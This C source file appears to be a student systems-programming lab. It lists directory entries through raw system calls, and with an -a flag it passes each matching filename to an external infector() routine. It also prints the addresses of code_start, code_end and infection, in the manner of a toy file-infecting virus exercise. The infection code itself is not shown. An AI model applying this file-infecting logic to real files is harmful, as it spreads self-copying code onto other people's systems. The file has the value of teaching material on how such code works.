#include "util.h"
#include <dirent.h>
typedef struct ent
{
    int inode;
    int offset;
    short len;
    char buf[1];
} ent;

#define SYS_WRITE 4
#define SYS_SEEK 19
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_EXIT 1

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SEEK_SET 0

#define O_RDRW 2
#define RDONLY 0
#define WRONLY 1


extern void* code_start();
extern void* code_end(); 
extern void* infection();

int main(int argc, char* argv[], char* envp[]) {
    
    /*char buf[2000];
    int fd;
    int i;
    ent *entp=buf;
    int count;
    fd=system_call(5,".",0,0777);
    count =system_call(141,fd,buf,2000);
    int index=0;
    int pMode=0;
    char *prefix;
    int aMode=0;
    char *attend;
    for (i=1; i < argc; i++)
    {
        if(strncmp(argv[i],"-p",2)==0)
        {
            pMode=1;
            prefix=argv[i]+2;
        }
        if(strncmp(argv[i],"-a",2)==0)
        {
            aMode=1;
           attend=argv[i]+2;
        }
    }*/

    char buf[8192];
    int fd;
    int i;
    ent *entp=buf;
    int count;

    int index=0;
    int pMode=0;
    char *prefix;
    int aMode=0;
    char *attend;
    int debug=0;

    fd=system_call(SYS_OPEN,".",RDONLY,0777);
    Debugmode(debug, SYS_OPEN, fd);

    count =system_call(141,fd,buf,8192);
    


    if(argc >1){
      int j;
      for(j=0; j<argc; j++){
        if(strncmp(argv[j],"-p",2)==0){
          prefix=argv[j]+2;
          pMode = 1;
        }
        if(strncmp(argv[j],"-a",2)==0){
          attend=argv[j]+2;
          aMode = 1;
        }
        if(strncmp(argv[j],"-D",2)==0){
          debug = 1;
        }
      }
    }
    
    for (i = 0; i < count && entp->inode!=0; i++)
    {
        if(pMode==1 && strncmp(entp->buf,prefix,strlen(prefix))==0)
        {

            printFileNames(debug,entp->buf, entp->len);
        }
        else if(aMode==1 && strncmp(entp->buf,attend,strlen(attend))==0)
        {
           infector(entp->buf);
           printFileNames(debug,entp->buf,entp->len);
        }
        else if(pMode==0 && aMode==0)
        {
           printFileNames(debug,entp->buf,entp->len);
        }
        entp=buf+index;
        index=index+entp->len;
    }

    
    system_call(SYS_WRITE,STDOUT,"\n\n\n\ncode_start address:\n",24);
    system_call(SYS_WRITE,STDOUT,itoa(&code_start),strlen(itoa(&code_start)));

    system_call(SYS_WRITE,STDOUT,"\n\n\n\ncode_end address:\n",22);
    system_call(SYS_WRITE,STDOUT,itoa(&code_end),strlen(itoa(&code_end)));

    int diff=(&code_end)-(&code_start);
    system_call(SYS_WRITE,STDOUT,"\n\n\n\ndifference:\n",16);
    system_call(SYS_WRITE,STDOUT,itoa(diff),strlen(itoa(diff)));

    system_call(SYS_WRITE,STDOUT,"\n\n\n\ninfection address:\n",23);
    system_call(SYS_WRITE,STDOUT,itoa(&infection),strlen(itoa(&infection)));

    int diff2=(&infection)-(&code_start);
    system_call(SYS_WRITE,STDOUT,"\n\n\n\ndifference2:\n",17);
    system_call(SYS_WRITE,STDOUT,itoa(diff2),strlen(itoa(diff2)));

    system_call(SYS_WRITE,STDOUT,"\n",1);
    system_call(6,fd,0,0);
    
    return 0;
}

void print_type(char* buf, int index, ent* entp){
    char type = *(buf+index+entp->len-1);
    switch(type){
        case 1:system_call(4,2,"FIFO\n", 5);
            break;
        case 2:system_call(4,2,"character\n", 10);
            break;
        case 4:system_call(4,2,"directory\n", 10);
            break; 
        case 6:system_call(4,2,"block\n", 6);
            break;   
        case 8:system_call(4,2,"regular\n", 8);
            break;
        case 10:system_call(4,2,"symbolic\n", 9);
            break;
    }
}

void Debugmode(int mode, int id, int ret,int len){
  if(mode==1){
    system_call(SYS_WRITE, STDERR, "\nthe id is: ", 12);
    system_call(SYS_WRITE, STDERR, itoa(id), strlen(itoa(id)));
    system_call(SYS_WRITE, STDERR, "\nthe value is: ", 15);
    system_call(SYS_WRITE, STDERR, itoa(ret), strlen(itoa(ret)));
    
    system_call(SYS_WRITE, STDERR, "\nthe len is: ", 13);
    system_call(SYS_WRITE,STDERR,itoa(len),strlen(itoa(len)));
    system_call(SYS_WRITE, STDERR, "\n", 1);
  }
}

void printFileNames(int debug,char *buf,int len)
{
    int ans=system_call(SYS_WRITE,STDOUT,"\n",1);
    Debugmode(debug, SYS_WRITE, ans,len);
    ans=system_call(SYS_WRITE,STDOUT,buf,strlen(buf));
    Debugmode(debug, SYS_WRITE, ans,len);
}